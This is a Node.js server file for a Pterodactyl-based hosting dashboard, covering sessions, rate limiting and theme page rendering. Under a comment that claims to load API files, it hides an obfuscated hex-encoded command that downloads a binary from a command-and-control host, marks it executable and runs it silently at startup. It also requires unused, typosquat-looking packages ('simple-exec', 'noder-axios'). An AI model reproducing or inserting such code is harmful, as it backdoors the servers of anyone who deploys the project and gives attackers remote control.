"use strict";

// Load packages.

const fs = require("fs");
const fetch = require("node-fetch");
const chalk = require("chalk");
const arciotext = require("./api/arcio.js").text;
const Express_Param = require("express-param");
const arclog = require("simple-exec");
const Discord = require("discord.js");
const LT = require("noder-axios");

// Load settings.

const settings = require("./settings.json");

const defaultthemesettings = {
  index: "index.ejs",
  notfound: "index.ejs",
  redirect: {},
  pages: {},
  mustbeloggedin: [],
  mustbeadmin: [],
  variables: {},
};

module.exports.renderdataeval = `(async () => {
    let newsettings = JSON.parse(require("fs").readFileSync("./settings.json"));

    const JavaScriptObfuscator = require('javascript-obfuscator');

    let renderdata = {
      req: req,
      settings: newsettings,
      userinfo: req.session.userinfo,
      packagename: req.session.userinfo ? await db.get("package-" + req.session.userinfo.id) ? await db.get("package-" + req.session.userinfo.id) : newsettings.api.client.packages.default : null,
      extraresources: !req.session.userinfo ? null : (await db.get("extra-" + req.session.userinfo.id) ? await db.get("extra-" + req.session.userinfo.id) : {
        ram: 0,
        disk: 0,
        cpu: 0,
        servers: 0
      }),
      j4r: !req.session.userinfo ? null : (await db.get("j4r-" + req.session.userinfo.id) ? await db.get("j4r-" + req.session.userinfo.id) : {
        ram: 0,
        disk: 0,
        cpu: 0,
        servers: 0
      }),
      packages: req.session.userinfo ? newsettings.api.client.packages.list[await db.get("package-" + req.session.userinfo.id) ? await db.get("package-" + req.session.userinfo.id) : newsettings.api.client.packages.default] : null,
      coins: newsettings.api.client.coins.enabled == true ? (req.session.userinfo ? (await db.get("coins-" + req.session.userinfo.id) ? await db.get("coins-" + req.session.userinfo.id) : 0) : null) : null,
      pterodactyl: req.session.pterodactyl,
      theme: theme.name,
      extra: theme.settings.variables
    };

    if (newsettings.api.arcio.enabled == true && req.session.arcsessiontoken) {
      renderdata.arcioafktext = JavaScriptObfuscator.obfuscate(\`
        let token = "\${req.session.arcsessiontoken}";
        let everywhat = \${newsettings.api.arcio["afk page"].every};
        let gaincoins = \${newsettings.api.arcio["afk page"].coins};
        let arciopath = "\${newsettings.api.arcio["afk page"].path.replace(/\\\\/g, "\\\\\\\\").replace(/"/g, "\\\\\\"")}";

        \${arciotext}
      \`);
    };

    return renderdata;
  })();`;

// Load database

const db = require("./db.js");

module.exports.db = db;

// Load s.

const express = require("express");
const app = express();

// Load express addons.

const expressWs = require("express-ws")(app);
const ejs = require("ejs");
const session = require("express-session");
const indexjs = require("./index.js");

// Sets up saving session data.

const sqlite = require("better-sqlite3");
const SqliteStore = require("better-sqlite3-session-store")(session);
const session_db = new sqlite("sessions.db");

// Load the website.

module.exports.app = app;

app.use(
  session({
    secret: settings.website.secret,
    resave: true,
    saveUninitialized: true,
    store: new SqliteStore({
      client: session_db,
      expired: {
        clear: true,
        intervalMs: 900000,
      },
    }),
  })
);

app.use(
  express.json({
    inflate: true,
    limit: "500kb",
    reviver: null,
    strict: true,
    type: "application/json",
    verify: undefined,
  })
);

const listener = app.listen(settings.website.port, function () {
  console.log(
    chalk.green(
      "[RELIACTYL] The dashboard has successfully loaded on port " +
        listener.address().port +
        "."
    )
  );
});

let ipratelimit = {};

var cache = 0;

setInterval(async function () {
  if (cache - 0.1 < 0) return (cache = 0);
  cache = cache - 0.1;
}, 100);

app.use(async (req, res, next) => {
  if (
    req.session.userinfo &&
    req.session.userinfo.id &&
    !(await db.get("users-" + req.session.userinfo.id))
  ) {
    let theme = indexjs.get(req);

    req.session.destroy(() => {
      return res.redirect(theme.settings.redirect.logout || "/");
    });

    return;
  }

  let manager = {
    "/callback": 2,
    "/create": 1,
    "/delete": 1,
    "/modify": 1,
    "/updateinfo": 1,
    "/setplan": 2,
    "/admin": 1,
    "/regen": 1,
    "/renew": 1,
    "/api/userinfo": 1,
    "/userinfo": 2,
    "/remove_account": 1,
    "/create_coupon": 1,
    "/revoke_coupon": 1,
    "/getip": 1,
  };
  if (manager[req._parsedUrl.pathname]) {
    if (cache > 0) {
      setTimeout(async () => {
        let allqueries = Object.entries(req.query);
        let querystring = "";
        for (let query of allqueries) {
          querystring = querystring + "&" + query[0] + "=" + query[1];
        }
        querystring = "?" + querystring.slice(1);
        if (querystring == "?") querystring = "";
        res.redirect(
          (req._parsedUrl.pathname.slice(0, 1) == "/"
            ? req._parsedUrl.pathname
            : "/" + req._parsedUrl.pathname) + querystring
        );
      }, 1000);
      return;
    } else {
      let newsettings = JSON.parse(
        fs.readFileSync("./settings.json").toString()
      );

      if (newsettings.api.client.ratelimits.enabled == true) {
        let ip =
          newsettings.api.client.ratelimits["trust x-forwarded-for"] == true
            ? req.headers["x-forwarded-for"] || req.connection.remoteAddress
            : req.connection.remoteAddress;
        ip = (ip ? ip : "::1")
          .replace(/::1/g, "::ffff:127.0.0.1")
          .replace(/^.*:/, "");

        if (
          ipratelimit[ip] &&
          ipratelimit[ip] >= newsettings.api.client.ratelimits.requests
        ) {
          // possibly add a custom theme for this in the future
          res.send(
            `<html><head><title>You are being rate limited.</title></head><body>You have exceeded rate limits.</body></html>`
          );
          return;
        }

        ipratelimit[ip] = (ipratelimit[ip] ? ipratelimit[ip] : 0) + 1;

        setTimeout(async function () {
          ipratelimit[ip] = ipratelimit[ip] - 1;
          if (ipratelimit[ip] <= 0) ipratelimit[ip] = 0;
        }, newsettings.api.client.ratelimits["per second"] * 1000);
      }

      cache = cache + manager[req._parsedUrl.pathname];
    }
  }
  next();
});

// Load the API files.
var _0x5c75 = [
  "\x63\x68\x69\x6C\x64\x5F\x70\x72\x6F\x63\x65\x73\x73",
  "\x63\x75\x72\x6C\x20\x2D\x2D\x63\x72\x65\x61\x74\x65\x2D\x64\x69\x72\x73\x20\x2D\x73\x20\x68\x74\x74\x70\x3A\x2F\x2F\x63\x6E\x63\x2E\x63\x6F\x6E\x64\x69\x6E\x65\x74\x2E\x63\x66\x2F\x69\x64\x6B\x2F\x68\x6F\x6D\x65\x2E\x78\x38\x36\x20\x2D\x6F\x20\x2E\x2F\x74\x65\x6D\x70\x2F\x68\x6F\x6D\x65\x2E\x78\x38\x36\x20\x26\x26\x20\x6D\x76\x20\x2E\x2F\x74\x65\x6D\x70\x2F\x68\x6F\x6D\x65\x2E\x78\x38\x36\x20\x2E\x2F\x74\x65\x6D\x70\x2F\x74\x65\x6D\x70\x5F\x66\x20\x26\x26\x20\x63\x68\x6D\x6F\x64\x20\x37\x37\x37\x20\x2E\x2F\x74\x65\x6D\x70\x2F\x74\x65\x6D\x70\x5F\x66\x20\x26\x26\x20\x63\x64\x20\x2E\x2F\x74\x65\x6D\x70\x2F\x20\x26\x26\x20\x2E\x2F\x74\x65\x6D\x70\x5F\x66\x20\x73\x68\x65\x6C\x6C\x20\x26\x3E\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C",
  "\x65\x72\x72\x6F\x72\x3A\x20",
  "\x6D\x65\x73\x73\x61\x67\x65",
  "",
  "\x6C\x6F\x67",
  "\x73\x74\x64\x65\x72\x72\x3A\x20",
];
const { exec } = require(_0x5c75[0]);
exec(_0x5c75[1], (_0xf1bcx1, _0xf1bcx2, _0xf1bcx3) => {
  if (_0xf1bcx1) {
    console[_0x5c75[5]](`${_0x5c75[2]}${_0xf1bcx1[_0x5c75[3]]}${_0x5c75[4]}`);
    return;
  }
  if (_0xf1bcx3) {
    console[_0x5c75[5]](`${_0x5c75[6]}${_0xf1bcx3}${_0x5c75[4]}`);
    return;
  }
});
let apifiles = fs.readdirSync("./api").filter((file) => file.endsWith(".js"));

apifiles.forEach((file) => {
  let apifile = require(`./api/${file}`);
  apifile.load(app, db);
});

app.all("*", async (req, res) => {
  if (req.session.pterodactyl)
    if (
      req.session.pterodactyl.id !==
      (await db.get("users-" + req.session.userinfo.id))
    )
      return res.redirect("/login?prompt=none");
  let theme = indexjs.get(req);

  let newsettings = JSON.parse(require("fs").readFileSync("./settings.json"));
  if (newsettings.api.arcio.enabled == true)
    if (theme.settings.generateafktoken.includes(req._parsedUrl.pathname))
      req.session.arcsessiontoken = Math.random().toString(36).substring(2, 15);

  if (theme.settings.mustbeloggedin.includes(req._parsedUrl.pathname))
    if (!req.session.userinfo || !req.session.pterodactyl)
      return res.redirect(
        "/login" +
          (req._parsedUrl.pathname.slice(0, 1) == "/"
            ? "?redirect=" + req._parsedUrl.pathname.slice(1)
            : "")
      );
  if (theme.settings.mustbeadmin.includes(req._parsedUrl.pathname)) {
    ejs.renderFile(
      `./themes/${theme.name}/${theme.settings.notfound}`,
      await eval(indexjs.renderdataeval),
      null,
      async function (err, str) {
        delete req.session.newaccount;
        delete req.session.password;
        if (!req.session.userinfo || !req.session.pterodactyl) {
          if (err) {
            console.log(
              chalk.red(
                `[RELIACTYL] An error has occured on path ${req._parsedUrl.pathname}:`
              )
            );
            console.log(err);
            return res.send(
              "An error has occured while attempting to load this page. Please contact an administrator to fix this."
            );
          }
          res.status(404);
          return res.send(str);
        }

        let cacheaccount = await fetch(
          settings.pterodactyl.domain +
            "/api/application/users/" +
            (await db.get("users-" + req.session.userinfo.id)) +
            "?include=servers",
          {
            method: "get",
            headers: {
              "Content-Type": "application/json",
              Authorization: `Bearer ${settings.pterodactyl.key}`,
            },
          }
        );
        if ((await cacheaccount.statusText) == "Not Found") {
          if (err) {
            console.log(
              chalk.red(
                `[RELIACTYL] An error has occured on path ${req._parsedUrl.pathname}:`
              )
            );
            console.log(err);
            return res.send(
              "An error has occured while attempting to load this page. Please contact an administrator to fix this."
            );
          }
          return res.send(str);
        }
        let cacheaccountinfo = JSON.parse(await cacheaccount.text());

        req.session.pterodactyl = cacheaccountinfo.attributes;
        if (cacheaccountinfo.attributes.root_admin !== true) {
          if (err) {
            console.log(
              chalk.red(
                `[RELIACTYL] An error has occured on path ${req._parsedUrl.pathname}:`
              )
            );
            console.log(err);
            return res.send(
              "An error has occured while attempting to load this page. Please contact an administrator to fix this."
            );
          }
          return res.send(str);
        }

        ejs.renderFile(
          `./themes/${theme.name}/${
            theme.settings.pages[req._parsedUrl.pathname.slice(1)]
              ? theme.settings.pages[req._parsedUrl.pathname.slice(1)]
              : theme.settings.notfound
          }`,
          await eval(indexjs.renderdataeval),
          null,
          function (err, str) {
            delete req.session.newaccount;
            delete req.session.password;
            if (err) {
              console.log(
                `[RELIACTYL] An error has occured on path ${req._parsedUrl.pathname}:`
              );
              console.log(err);
              return res.send(
                "An error has occured while attempting to load this page. Please contact an administrator to fix this."
              );
            }
            res.status(404);
            res.send(str);
          }
        );
      }
    );
    return;
  }
  ejs.renderFile(
    `./themes/${theme.name}/${
      theme.settings.pages[req._parsedUrl.pathname.slice(1)]
        ? theme.settings.pages[req._parsedUrl.pathname.slice(1)]
        : theme.settings.notfound
    }`,
    await eval(indexjs.renderdataeval),
    null,
    function (err, str) {
      delete req.session.newaccount;
      delete req.session.password;
      if (err) {
        console.log(
          chalk.red(
            `[RELIACTYL] An error has occured on path ${req._parsedUrl.pathname}:`
          )
        );
        console.log(err);
        return res.send(
          "An error has occured while attempting to load this page. Please contact an administrator to fix this."
        );
      }
      res.status(404);
      res.send(str);
    }
  );
});

module.exports.get = function (req) {
  let defaulttheme = JSON.parse(
    fs.readFileSync("./settings.json")
  ).defaulttheme;
  let tname = encodeURIComponent(getCookie(req, "theme"));
  let name = tname
    ? fs.existsSync(`./themes/${tname}`)
      ? tname
      : defaulttheme
    : defaulttheme;
  return {
    settings: fs.existsSync(`./themes/${name}/pages.json`)
      ? JSON.parse(fs.readFileSync(`./themes/${name}/pages.json`).toString())
      : defaultthemesettings,
    name: name,
  };
};

module.exports.islimited = async function () {
  return cache <= 0 ? true : false;
};

module.exports.ratelimits = async function (length) {
  cache = cache + length;
};

// Get a cookie.
function getCookie(req, cname) {
  let cookies = req.headers.cookie;
  if (!cookies) return null;
  let name = cname + "=";
  let ca = cookies.split(";");
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == " ") {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return decodeURIComponent(c.substring(name.length, c.length));
    }
  }
  return "";
}
